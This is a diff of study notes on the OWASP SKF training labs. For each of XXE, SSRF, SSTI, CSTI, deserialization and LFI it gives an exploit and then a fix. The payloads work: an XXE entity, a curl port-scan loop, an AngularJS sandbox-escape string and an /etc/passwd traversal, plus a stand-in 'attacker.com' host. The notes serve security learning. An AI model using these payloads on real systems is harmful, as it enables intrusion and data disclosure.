@@ -1,8 +1,8 @@
-#XXE
-##Preparation
+# XXE
+## Preparation
 docker pull blabla1337/owasp-skf-lab:
 docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:
-##Exploit
+## Exploit
 Add entity and bind this to a variable that will be printed:
 ```<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
@@ -14,7 +14,7 @@ Add entity and bind this to a variable that will be printed:
 
 So if you want to go to an external site, you could just place a path there:
 "http://www.attacker.com/text.txt" instead of the file.
-##Fix
+## Fix
 https://docs.python.org/3/library/xml.dom.pulldom.html
 So we add an extra parser.
 Add imports:
@@ -26,8 +26,8 @@ Add parser:
     doc = parseString(request.form['xxe'],parser=parser)^M        
 
 
-#SSRF
-##Exploit
+# SSRF
+## Exploit
 Check for different ports on localhost:
 http://127.0.0.1:3306
 automated:
@@ -35,16 +35,16 @@ in burp right click request and copy as bash script, modify in loop to:
 for i in {1..10000} ; do echo $i; curl -i -s -k  -X $'POST' -F url=http://127.0.0.1:${i} $'http://security:5000/check_existence' |grep "is reach" ; done ;
 not very pretty but it works...
 -> other open port 5432
-##Fix
+## Fix
 blacklist localhost, so it won't search in its own space
 
 
-#SSTI
-##Exploit
+# SSTI
+## Exploit
 http://localhost:5000/{{1=1}}
 and other real exploits from:
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
-##Fix
+## Fix
 Move template to its own file. in /templates directory
 ```
 <!DOCTYPE html>                                                                                                                                                      
@@ -158,33 +158,33 @@ but now we might have XSS:
 {% autoescape true %}{{ssti}}{% endautoescape %}                                                                                                            
 
 
-#CSTI
+# CSTI
 !!! Works in Chrome but exploit won't work in Firefox !!!
-##Exploit
+## Exploit
 vulnerability in angularjs 1.5 for CSTI, see line 137:
 https://github.com/tijme/angularjs-csti-scanner/blob/master/acstis/Payloads.py
 ```
 {{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}
 ```
-##Fix
+## Fix
 {% autoescape true %}{{ssti}}{% endautoescape %}                                                                                                            
 TODO: how do you know that autoescape also escapes {{ and other angularJS risky characters?
 
 
-#Insecure Deserialization
+# Insecure Deserialization
 How to recognize it on the wire? Binary format is AC ED 00 05 (05 being the protocol version number)
 most exploited one is using commands from Java Apache Common Collection as it's in the classpath most of the time
 https://github.com/frohoff/ysoserial
 
 DES-Yaml
-##Exploit
+## Exploit
 TODO
-##Fix
+## Fix
 TODO
 
 
-#LFI/RFI
-##Exploit
+# LFI/RFI
+## Exploit
 In payload use text/../../../../../../../../etc/passwd
-##Fix
+## Fix
 whitelist
